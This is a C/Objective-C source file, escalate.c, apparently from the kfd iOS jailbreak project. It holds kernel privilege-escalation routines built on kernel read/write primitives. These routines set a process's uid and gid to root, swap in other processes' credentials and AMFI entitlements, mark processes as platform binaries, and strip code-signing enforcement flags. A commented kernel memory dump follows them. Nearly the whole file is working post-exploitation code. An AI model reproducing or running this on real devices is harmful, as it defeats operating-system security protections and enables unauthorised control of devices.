//
//  escalate.c
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/19.
//
#include <Foundation/Foundation.h>
#include <UIKit/UIKit.h>
#include "krw.h"
#include "offsets.h"
#include "proc.h"
#include "escalate.h"



#define SYSTEM_VERSION_EQUAL_TO(v)                  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedSame)
#define SYSTEM_VERSION_GREATER_THAN(v)              ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedDescending)
#define SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(v)  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN(v)                 ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(v)     ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedDescending)

extern char **environ;

uint64_t borrow_entitlements(pid_t to_pid, pid_t from_pid) {
    
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t from_proc = proc_of_pid(from_pid);
    
    uint64_t to_ro_proc = kread64(to_proc + off_p_ro);
    uint64_t to_cr_label = kread64(to_ro_proc + off_u_cr_label);
    
    uint64_t from_ro = kread64(from_proc + off_p_ro);
    uint64_t from_cr_label = kread64(from_ro + off_u_cr_label);

    uint64_t to_amfi = kread64(to_cr_label + off_amfi_slot);
    uint64_t from_amfi = kread64(from_cr_label + off_amfi_slot);
    
   // kcallKRW(proc_set_ucred_func, proc_addr, LDproc_ucred, 0, 0, 0, 0, 0);

    kwrite64(to_cr_label + off_amfi_slot, from_amfi);
    
    return to_amfi;
}

void unborrow_entitlements(pid_t to_pid, uint64_t to_amfi) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t to_cr_label = kread64(to_ucred + off_u_cr_label);
    
    kwrite64(to_cr_label + off_amfi_slot, to_amfi);
}

uint64_t borrow_ucreds(pid_t to_pid, pid_t from_pid) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t from_proc = proc_of_pid(from_pid);
    
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t from_ucred = kread64(from_proc + off_p_ucred);
    
    kwrite64(to_proc + off_p_ucred, from_ucred);
    
    return to_ucred;
}

void unborrow_ucreds(pid_t to_pid, uint64_t to_ucred) {
    uint64_t to_proc = proc_of_pid(to_pid);
    
    kwrite64(to_proc + off_p_ucred, to_ucred);
}

bool rootify(pid_t pid) {
    if (!pid) return false;

    uint64_t proc = proc_of_pid(pid);
    uint64_t ucred = kread64(proc + off_p_ucred);
    
    //make everything 0 without setuid(0), pretty straightforward.
    kwrite32(proc + off_p_uid, 0); //all changed in 15.3.1 offsets afaik
    kwrite32(proc + off_p_ruid, 0);
    kwrite32(proc + off_p_gid, 0);
    kwrite32(proc + off_p_rgid, 0);
    kwrite32(ucred + off_u_cr_uid, 0);
    kwrite32(ucred + off_u_cr_ruid, 0);
    kwrite32(ucred + off_u_cr_svuid, 0);
    kwrite32(ucred + off_u_cr_ngroups, 1);
    kwrite32(ucred + off_u_cr_groups, 0);
    kwrite32(ucred + off_u_cr_rgid, 0);
    kwrite32(ucred + off_u_cr_svgid, 0);

    return (kread32(proc + off_p_uid) == 0) ? true : false;
    return false;
}

uint64_t run_borrow_entitlements(pid_t to_pid, char* from_path) {
    posix_spawnattr_t attrp;
    posix_spawnattr_init(&attrp);
    posix_spawnattr_setflags(&attrp, POSIX_SPAWN_START_SUSPENDED);
    
    NSString *from_path_ns = [NSString stringWithUTF8String:from_path];
    char *last_process = [[from_path_ns componentsSeparatedByString:@"/"] lastObject].UTF8String;
    
    pid_t from_pid;
    const char *argv[] = {last_process, NULL};
    int retVal = posix_spawn(&from_pid, from_path, NULL, &attrp, (char* const*)argv, environ);
    if(retVal < 0) {
        printf("Couldn't posix_spawn");
        return -1;
    }
    
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t from_proc = proc_of_pid(from_pid);
    
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t from_ucred = kread64(from_proc + off_p_ucred);
    
    uint64_t to_cr_label = kread64(to_ucred + off_u_cr_label);
    uint64_t from_cr_label = kread64(from_ucred + off_u_cr_label);
    
    uint64_t to_amfi = kread64(to_cr_label + off_amfi_slot);
    uint64_t from_amfi = kread64(from_cr_label + off_amfi_slot);
    
    kwrite64(to_cr_label + off_amfi_slot, from_amfi);
    
    return to_amfi;
}

void kill_unborrow_entitlements(pid_t to_pid, uint64_t to_amfi, pid_t kill_pid) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t to_cr_label = kread64(to_ucred + off_u_cr_label);
    
    kwrite64(to_cr_label + off_amfi_slot, to_amfi);
    
    kill(kill_pid, SIGKILL);
}

bool set_task_platform(pid_t pid, bool set) {
   // setuid(501);
   // setuid(501);
    uint64_t proc = proc_of_pid(pid);
    //printf("proc = 0x%llx\n", proc);

    uint64_t task = kread64(proc + off_p_task);
    uint32_t t_flags = kread32(task + off_task_t_flags);//524291 right , 526339 wrong , 131152 FUCK ITS WRONG AGAIN
   // printf("t_flags = 0x%x\n", t_flags);

    if (set) {
        t_flags |= TF_PLATFORM;//525315 right , 527363 wrong //1024 tfPlatflorm alone //
       // printf("t_flags = 0x%x\n", t_flags);
        //132167
    } else {
        t_flags &= ~(TF_PLATFORM);
      //  printf("t_flags = 0x%x\n", t_flags);

    }
    
    kwrite32(task + off_task_t_flags, t_flags);
    
    return true;
}
#define CS_HARD            0x00000100  /* don't load invalid pages */
#define CS_KILL            0x00000200  /* kill process if it becomes invalid */
#define CS_RESTRICT        0x00000800  /* tell dyld to treat restricted */
#define CS_ENFORCEMENT     0x00001000  /* require enforcement */
#define CS_REQUIRE_LV      0x00002000  /* require library validation */
#define CS_PLATFORM_BINARY 0x04000000  /* this is a platform binary */

#define MAKE_KPTR(v) (v | 0xffffff8000000000)
//uint64_t proc_set_ucred_func;
void set_proc_csflags(pid_t pid) {
    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"15.2")) {
       // printf("getuid: %d\n", getuid());
        uint64_t proc = proc_of_pid(pid);
        uint64_t proc_ro = MAKE_KPTR(kread64(proc + off_p_ro));//PROC_RO(proc);
        //printf("proc_ro = 0x%llx\n", proc_ro);
        uint64_t flags_ro = kread64(proc_ro + 0x78);
        //printf("flags_ro = 0x%llx\n", flags_ro);//838868996
        uint32_t flags = MAKE_KPTR(kread32(proc_ro + off_p_csflags));
        //printf("flags = 0x%x\n", flags);//838868996
        //flags &= CS_PLATFORM_BINARY;
        flags = flags | CS_DEBUGGED | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW;//905977868
        //printf("flags = 0x%x\n", flags);
        flags &= ~(CS_HARD | CS_KILL | CS_RESTRICT | CS_ENFORCEMENT | CS_REQUIRE_LV);//905969676
        //flags &= ~(CS_RESTRICT | CS_HARD | CS_KILL);
        //printf("flags = 0x%x\n", flags);
        kwrite32(proc_ro + 0x1C, flags);

       // kcallKRW(proc_ro + off_p_csflags, proc_set_ucred_func, flags, 0, 0, 0, 0, 0);
       // kcallKRW(proc_set_ucred_func, kread32(proc_ro + off_p_csflags), flags, 0, 0, 0, 0, 0);

        // use proc_set_ucred to set kernel ucred.
        //kwrite64(proc_ro + off_p_csflags, flags);
    } else {
        uint64_t proc = proc_of_pid(pid);
        uint32_t csflags = kread32(proc + off_p_csflags);//838868996
        //printf("csflags = 0x%x\n", csflags);
        csflags = csflags | CS_DEBUGGED | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW;//905977868, 905977868
       // printf("csflags = 0x%x\n", csflags);
        csflags &= ~(CS_RESTRICT | CS_HARD | CS_KILL);//905977868
       // printf("csflags = 0x%x\n", csflags);

        kwrite32(proc + off_p_csflags, csflags);

    }
    
}

uint64_t get_cs_blob(pid_t pid) {
    uint64_t proc = proc_of_pid(pid);
    uint64_t textvp = kread64(proc + off_p_textvp);////0x2bc 648, 640?  0x18C
   // printf("textvp = 0x%llx\n", textvp);
    uint64_t ubcinfo = kread64(textvp + off_vnode_vu_ubcinfo);
  //  printf("ubcinfo = 0x%llx\n", ubcinfo);
    return kread64(ubcinfo + off_ubc_info_cs_blobs);
}

void set_csb_platform_binary(pid_t pid) {
    uint64_t cs_blob = get_cs_blob(pid);
    kwrite32(cs_blob + off_cs_blob_csb_platform_binary, 1);
}

void platformize(pid_t pid) {
    set_task_platform(pid, true);
    set_proc_csflags(pid);
    set_csb_platform_binary(pid);
}
#define PROC_TASK(proc)  kread64((proc) + 0x10ULL)
#define PROC_RO(proc)    kread64((proc) + 0x20ULL)
#define PROC_PID(proc)   kread32((proc) + 0x68ULL)

#define PROC_RO_CSFLAGS(proc_ro)          kread32((proc_ro) + 0x1CULL)
#define PROC_RO_CSFLAGS_SET(proc_ro, new) { uint32_t v = (uint32_t)(new); do_kwrite((proc_ro) + 0x1CULL, &v, 4); }
uint64_t proc_ro;
void newplatformize(pid_t pid){
    uint64_t proc = proc_of_pid(pid);
    uint64_t task = kread64(proc + off_p_task);
    uint32_t t_flags = kread32(task + off_task_t_flags) | TF_PLATFORM;//524291 right , 526339 wrong , 131152 FUCK ITS WRONG AGAIN
    kwrite32(task + off_task_t_flags, t_flags);
    uint32_t flags = PROC_RO_CSFLAGS(PROC_RO(proc)) | CS_PLATFORM_BINARY;
    printf("     flags = 0x%x\n", flags);//838868996
    //flags &= CS_PLATFORM_BINARY;
    //flags = flags | CS_DEBUGGED | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW;//905977868
    //printf("flags = 0x%x\n", flags);
    //flags &= ~(CS_HARD | CS_KILL | CS_RESTRICT | CS_ENFORCEMENT | CS_REQUIRE_LV);//905969676
    //flags &= ~(CS_RESTRICT | CS_HARD | CS_KILL);
    flags &= ~(CS_HARD | CS_KILL | CS_RESTRICT | CS_ENFORCEMENT | CS_REQUIRE_LV);
    
   // printf("     flags = 0x%x\n", flags);//905969668
    
   // PROC_RO_CSFLAGS(proc_ro);
   // flags = PROC_RO_CSFLAGS(proc_ro)
    //flags &= ~(CS_HARD | CS_KILL | CS_RESTRICT | CS_ENFORCEMENT | CS_REQUIRE_LV);
//    PROC_RO_CSFLAGS_SET(proc_ro, flags);
    uint64_t pro_ = kread64(proc + 0x20);
    uint32_t ro_flags = kread32(pro_ + 0x1c);//PROC_RO_CSFLAGS(PROC_RO(proc)) | CS_PLATFORM_BINARY;
    //printf("  ro_flags = 0x%x\n", ro_flags);//905969668
    uint32_t flagscheck = kread32(pro_ + 0x1c);//838868996
   // printf("flagscheck = 0x%x\n", flagscheck);//905969668
    //kwrite32(ro_flags, flags);//    kcallKRW(proc_set_ucred_func, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
   // kcallKRW(proc_set_ucred_func, pro_ + 0x1c, flags, 0, 0, 0, 0, 0);
    flagscheck = kread32(pro_ + 0x1c);//838868996
   // printf("flagscheck = 0x%x\n", flagscheck);//905969668
    //kwrite32(proc_ro + 0x1C, flags);

    
}
/*
 [0x0000]: fffffff01c03a968 0000002a00000001 fffffff5825a7a30 fffffff5825a4438 0001000100000001 fffffff49bec8400 0000000000000000 fffffff2cfeef0f0
 [0x0040]: 0000000000000000 0000000000000000 fffffff5825a4048 0000000000000000 0000000000000000 0000000000004000 fffffff57fc96bf8 0000000000000000
 [0x0080]: fffffff2cfb54960 0000000000000000 0000000000000000 0101000100000000 1ea5cace00000000 0000001400000000 0000000000000000 0000002a00000000
 [0x00c0]: fffffff6ba008e60 0000000000000000 0000000000000000 0000000000000000 0000000000000000 fffffff3b55ea170 0000000000000000 0000000000000000
 [0x0100]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000
 [0x0140]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000
 [0x0180]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000
 [0x01c0]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000
 [0x0200]: 0000000000000100 0000000000000000 0000000000000000 fffffff5825a4210 0000000000000000 fffffff5825a4220 0000000000000000 0000000000000000
 [0x0240]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000
 [0x0280]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 fffffff3b55e9b80 0000000000000002 0000000000000000 0000000000000000
 [0x02c0]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000
 [0x0300]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000
 [0x0340]: fffffff49c7a4b40 fffffff49c7a4b68 0000000100000001 0000000000010001 fffffff6b9238a80 0000000000000000 0000000000000000 0000000000000000
 [0x0380]: fffffff6b5e11040 0000000000000000 0000000000000001 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000020
 [0x03c0]:
 */
